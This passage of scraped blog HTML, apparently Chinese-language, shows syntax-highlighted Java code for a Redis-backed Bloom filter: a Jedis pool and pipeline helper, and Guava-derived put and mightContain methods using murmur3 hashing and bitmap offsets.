class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb4c972980957-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb4c972980957-35\">35</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-1\"><span class=\"crayon-n\">@FunctionalInterface</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-2\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">interface</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisExecutor</span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">T</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Jedis </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-4\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-6\"><span class=\"crayon-n\">@FunctionalInterface</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-7\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">interface</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PipelineExecutor</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">load</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Pipeline </span><span class=\"crayon-v\">pipeline</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-9\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-11\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisUtils</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-12\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">GenericObjectPoolConfig </span><span class=\"crayon-v\">poolConfig</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">GenericObjectPoolConfig</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisPool </span><span class=\"crayon-v\">jedisPool</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisUtils</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">jedisPool</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisPool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">poolConfig</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"localhost\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-20\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">T</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">JedisExecutor</span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisExecutor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Jedis </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisPool</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getResource</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-23\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisExecutor</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-26\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-27\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">List</span><span class=\"crayon-e \">&lt;Object&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pipeline</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">List</span><span class=\"crayon-e \">&lt;PipelineExecutor&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pipelineExecutors</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-28\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Jedis </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisPool</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getResource</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-29\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">Pipeline </span><span class=\"crayon-v\">pipeline</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">pipelined</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-30\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">PipelineExecutor </span><span class=\"crayon-v\">executor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pipelineExecutors</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-31\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">executor</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">load</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pipeline</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-32\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pipeline</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">syncAndReturnAll</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-33\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb4c972980957-34\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb4c972980957-35\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0046 seconds] -->\r\n<br>\n其次在Strategy中，对put和mightContain作了一点修改，其中被注释的部分是Guava中的实现。为了简化，这里我们只接受String对象。\n<p>这里先把所有的随机函数对应的索引位置收集到一个数组中，然后交由底层的RedisBitmaps处理get或set，具体过程后面会详细说明。</p>\n<p>bits.ensureCapacityInternal()方法，即表示自动扩容，这个函数名是从ArrayList中搬过来的。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359b36cb51485687448\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n    @ Override\r\n    public boolean put(String string, int numHashFunctions, RedisBitmaps bits) {\r\n        long bitSize = bits.bitSize();\r\n        byte[] bytes = Hashing.murmur3_128().hashString(string, Charsets.UTF_8).asBytes();\r\n        long hash1 = lowerEight(bytes);\r\n        long hash2 = upperEight(bytes);\r\n\r\n        boolean bitsChanged = false;\r\n        long combinedHash = hash1;\r\n//        for (int i = 0; i &lt; numHashFunctions; i++) {\r\n//            bitsChanged |= bits.set((combinedHash &amp; Long.MAX_VALUE) % bitSize);\r\n//            combinedHash += hash2;\r\n//        }\r\n        long[] offsets = new long[numHashFunctions];\r\n        for (int i = 0; i &lt; numHashFunctions; i++) {\r\n            offsets[i] = (combinedHash &amp; Long.MAX_VALUE) % bitSize;\r\n            combinedHash += hash2;\r\n        }\r\n        bitsChanged = bits.set(offsets);\r\n        bits.ensureCapacityInternal();//自动扩容\r\n        return bitsChanged;\r\n    }\r\n\r\n    @ Override\r\n    public boolean mightContain(String object, int numHashFunctions, RedisBitmaps bits) {\r\n        long bitSize = bits.bitSize();\r\n        byte[] bytes = Hashing.murmur3_128().hashString(object, Charsets.UTF_8).asBytes();\r\n        long hash1 = lowerEight(bytes);\r\n        long hash2 = upperEight(bytes);\r\n        long combinedHash = hash1;\r\n//        for (int i = 0; i &lt; numHashFunctions; i++) {\r\n//            if (!bits.get((combinedHash &amp; Long.MAX_VALUE) % bitSize)) {\r\n//                return false;\r\n//            }\r\n//            combinedHash += hash2;\r\n//        }\r\n//        return true;\r\n        long[] offsets = new long[numHashFunctions];\r\n        for (int i = 0; i &lt; numHashFunctions; i++) {\r\n            offsets[i] = (combinedHash &amp; Long.MAX_VALUE) % bitSize;\r\n            combinedHash += hash2;\r\n        }\r\n        return bits.get(offsets);\r\n    }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb51485687448-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb51485687448-44\">44</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-1\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">@</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Override</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-2\"><span class=\"crayon-e\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">string</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisBitmaps </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">bitSize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">byte</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bytes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Hashing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">murmur3_128</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hashString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">string</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Charsets</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">UTF_8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">asBytes</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lowerEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">upperEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-10\"><span class=\"crayon-c\">//        for (int i = 0; i &lt; numHashFunctions; i++) {</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-11\"><span class=\"crayon-c\">//            bitsChanged |= bits.set((combinedHash &amp; Long.MAX_VALUE) % bitSize);</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-12\"><span class=\"crayon-c\">//            combinedHash += hash2;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-13\"><span class=\"crayon-c\">//        }</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-14\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-16\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MAX_VALUE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-20\"><span class=\"crayon-h\">        </span><span 